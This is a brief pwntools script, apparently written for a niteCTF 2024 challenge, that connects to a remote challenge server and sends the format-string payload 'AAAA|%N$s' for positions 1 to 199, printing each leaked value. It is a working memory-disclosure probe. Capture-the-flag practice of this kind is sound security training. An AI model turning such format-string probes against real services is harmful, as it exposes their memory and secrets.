from pwn import *

elf = context.binary = ELF('./chall_patched')
context.log_level = 'error'

for i in range(1, 200):
    try:
        # p = process(['./chall_patched', 'flag.txt'])
        p = remote('print-the-gifts.chals.nitectf2024.live', 1337, ssl=True)

        p.sendlineafter('>', "AAAA|%{}$s".format(i).encode())

        print(str(i).encode() + b': ' + p.recvline().strip(b'\n'))
        
        p.close()

    except EOFError:
        pass
